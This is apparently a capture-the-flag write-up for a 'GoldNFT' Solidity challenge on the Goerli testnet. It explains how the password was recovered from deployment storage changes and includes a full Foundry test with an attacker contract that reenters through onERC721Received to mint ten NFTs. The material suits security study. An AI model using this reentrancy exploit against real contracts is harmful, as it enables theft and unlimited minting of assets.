## GoldNFT attack

It's possible to get one GoldNFT if you know the password that is checked on the unconfirmed contract at https://goerli.etherscan.io/address/0xe43029d90b47dd47611bad91f24f87bc9a03aec2 via the function `read`.

The GoldNFT is also vulnerable to an reentrence attack as it's not following the check effects interaction and so an attacker can mint an unlimited amount of nfts in the `onERC721Received` callback before minted is set to true if he knows the password.

Following the bytecode we can see that the password (bytes32) is checking the storage location of the password and if it is true.

`function func_006C(var arg0) returns (var r0) { return storage[arg0]; }`

There is a function 0x0daa5703 where you can set a chosen storage location a bool value, but it is protected for a specific caller.

Checking the deployment, we can see, that the storage location `0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe` was set to true.
https://goerli.etherscan.io/tx/0x88fc0f1dd855405d092fc408c3311e7131477ec201f39344c4f002371c23f81c#statechange

With the knowing of the password, we just need an attacker contract to mint the nft and use the `onERC721Received` to reenter until we have enough nft's minted.

## Test
forge test --match-contract=HackGoldNFTTest

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";

contract HackGoldNFTTest is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/eth_goerli", 8591866); 
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);
        // solution

        nftHack = new HackGoldNft(nft);
        nftHack.hackit();

        assertEq(nft.balanceOf(hacker), 10);
    }
}

contract HackGoldNft {
    GoldNFT nft;
    address immutable owner;

    constructor(GoldNFT _nft) {
        nft = _nft;
        owner = msg.sender;
    }

    // https://goerli.etherscan.io/tx/0x88fc0f1dd855405d092fc408c3311e7131477ec201f39344c4f002371c23f81c#statechange
    // Storageaddress 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe was set to true
    bytes32 pw = 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe;

    function hackit() external {
        nft.takeONEnft(pw);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes calldata) external returns(bytes4) {

        // reeneter for 10 times
        nft.transferFrom(address(this), owner, _tokenId);
        
        if(nft.balanceOf(owner) < 10) {
            nft.takeONEnft(pw);
        }

        return this.onERC721Received.selector;
    }
}
```